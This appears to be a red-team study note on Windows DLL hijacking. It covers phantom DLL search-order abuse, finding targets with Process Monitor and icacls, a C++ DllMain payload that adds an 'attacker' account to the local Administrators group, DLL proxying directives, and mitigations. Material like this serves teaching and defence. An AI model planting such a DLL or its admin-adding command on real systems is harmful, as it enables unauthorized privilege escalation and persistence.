---
tags: [windows, privesc, pentesting, red-team]
difficulty: intermediate
module: "43 - Windows Privilege Escalation"
topic: "43.06 DLL Hijacking"
---

# DLL Hijacking

## Introduction

Dynamic Link Libraries (DLLs) are essential components of the Windows operating system. A DLL is a library that contains code and data that can be used by more than one program at the same time. This modular approach promotes code reuse and efficient memory usage.

However, the way Windows applications locate and load these DLLs can introduce significant security vulnerabilities. "DLL Hijacking" (often conflated with DLL Search Order Abuse, though subtly different) occurs when an application attempts to load a DLL without specifying an absolute path, and an attacker places a malicious DLL with the identical name in a directory that is searched by the application *before* the directory containing the legitimate DLL (or if the legitimate DLL is missing entirely).

If the vulnerable application is running as a highly privileged user (such as `NT AUTHORITY\SYSTEM` or a local Administrator), the malicious DLL is loaded into the memory space of that process and executed with those same high privileges.

## The Mechanics of DLL Hijacking

To understand the vulnerability, one must understand the `LoadLibrary` API. When a developer writes `LoadLibrary("example.dll");` instead of `LoadLibrary("C:\\Windows\\System32\\example.dll");`, Windows must search the file system to find `example.dll`.

### Phantom DLL Hijacking
The most common and safest form of DLL Hijacking is "Phantom DLL Hijacking" (or missing DLL hijacking). This occurs when an application attempts to load a DLL that does not exist anywhere on the system. Because the DLL is missing, the application will search its entire search order, failing at every step.

If an attacker has write permissions to *any* directory in that search order, they can drop their malicious DLL there. The application will find it, load it, and execute it. Because the original DLL never existed, proxying the original functions is unnecessary, and the application usually does not crash.

```text
+--------------------------------------------------------------------------+
|                        PHANTOM DLL HIJACKING FLOW                        |
+--------------------------------------------------------------------------+
|
|  [ SYSTEM Process: C:\App\updater.exe ]
|
|  1. App calls LoadLibrary("missing_lib.dll")
|
|  2. Windows Search Sequence Initiated:
|     -> Checks C:\App\missing_lib.dll (NOT FOUND)
|     -> Checks C:\Windows\System32\missing_lib.dll (NOT FOUND)
|     -> Checks C:\Windows\missing_lib.dll (NOT FOUND)
|     -> Checks C:\Custom_Path\ (Writen by Attacker: FOUND!)
|
|  3. Attacker's missing_lib.dll is loaded into updater.exe memory.
|
|  4. DllMain executes malicious code as SYSTEM.
|
+--------------------------------------------------------------------------+
```

## Enumeration and Identification

Unlike service misconfigurations, finding DLL hijacking vulnerabilities manually via the command line is virtually impossible. It requires dynamic analysis using Sysinternals **Process Monitor (Procmon)**.

### Using Process Monitor

1.  **Start Procmon:** Launch Procmon as an administrator on the target machine (or a local replica).
2.  **Configure Filters:** Procmon generates massive amounts of data. You must filter for specific events indicating a failed DLL load.
    - Set Filter: `Result` `is` `NAME NOT FOUND` -> Include
    - Set Filter: `Path` `ends with` `.dll` -> Include
    - (Optional) Set Filter: `Process Name` `is` `target_app.exe` -> Include
3.  **Trigger the Application:** Start the application or service you suspect is vulnerable (or simply wait and watch background services).
4.  **Analyze Output:** Look for processes running as SYSTEM that are querying directories where a standard user has write access (e.g., `C:\Temp\`, `C:\Python27\`, or arbitrary application folders in `C:\`).

*Example Procmon Output:*
```text
Time    Process Name    Operation   Path                                Result          Detail
10:01   updater.exe     CreateFile  C:\App\Logs\helper.dll              NAME NOT FOUND  Desired Access: Read
```
If you verify via `icacls C:\App\Logs\` that standard users have `Modify` permissions, you have a viable hijack target.

## Crafting the Malicious DLL

A DLL payload must be crafted specifically to execute code when it is loaded into memory. The entry point of a DLL is the `DllMain` function. When `LoadLibrary` is called, `DllMain` executes automatically with the `DLL_PROCESS_ATTACH` reason.

### C++ DLL Skeleton
The following is a minimal C++ payload that executes a system command upon being loaded.

```cpp
// compile with: x86_64-w64-mingw32-g++ -shared -o helper.dll dllmain.cpp

#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // This code executes immediately upon the DLL being loaded
            system("cmd.exe /c net localgroup administrators attacker /add");
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

### Exploit Execution
1.  Compile the above code into `helper.dll`. Ensure the architecture matches the target process (e.g., compile as 64-bit if `updater.exe` is a 64-bit process).
2.  Copy `helper.dll` to the vulnerable location: `C:\App\Logs\helper.dll`.
3.  Trigger `updater.exe` (via restarting the associated service or running the scheduled task).
4.  The application loads `helper.dll`, `DllMain` fires, and the attacker is added to the Administrators group.

## The Complication: DLL Function Forwarding (Proxying)

If the hijacking target is *not* a phantom DLL, but an existing DLL, things get complicated. 
If `updater.exe` expects `helper.dll` to contain specific exported functions (e.g., `UpdateCheck()`, `FetchManifest()`), and our malicious DLL does not export those functions, `updater.exe` will crash immediately with an Entry Point Not Found error.

To avoid crashing the application (which alerts defenders and might halt the escalation process), attackers must use **DLL Proxying** (or DLL forwarding).
This involves extracting the list of exported functions from the legitimate DLL and creating a malicious DLL that exports the exact same functions, but forwards those calls to the original legitimate DLL (which is usually renamed to `helper_orig.dll`).

Tools like `Koppeling` or scripts like `DLL_Hijack_Proxy` automate this process by reading the PE headers of the original DLL and generating the C++ pragma directives required for forwarding.

```cpp
// Example of pragma forwarding directives in the malicious DLL
#pragma comment(linker,"/export:UpdateCheck=helper_orig.UpdateCheck,@1")
#pragma comment(linker,"/export:FetchManifest=helper_orig.FetchManifest,@2")
```

## Mitigations

Defending against DLL hijacking requires secure coding practices by developers and strict environment configurations by administrators.
- **Use Absolute Paths:** Developers should always use absolute paths when calling `LoadLibrary` (e.g., `LoadLibrary("C:\\App\\bin\\helper.dll");`).
- **SetDllDirectory:** Developers can use the `SetDllDirectory("")` API to remove the current working directory from the search order.
- **Directory Permissions:** Administrators must ensure that applications running as SYSTEM are not placed in directories where standard users have write permissions. The root of `C:\` and custom folders in `C:\` are notoriously vulnerable to this.

## Chaining Opportunities
- **Privilege Escalation:** Combines well with scheduled tasks or background services that run periodically as SYSTEM.
- **Persistence:** Dropping a malicious DLL in the path of a commonly used application (like Teams or OneDrive) is a prime persistence mechanism, as the payload fires every time the user launches the application.

## Related Notes
- [[01 - Windows PrivEsc Methodology Overview]]
- [[07 - DLL Search Order Abuse]]
- [[Windows Persistence Mechanisms]]
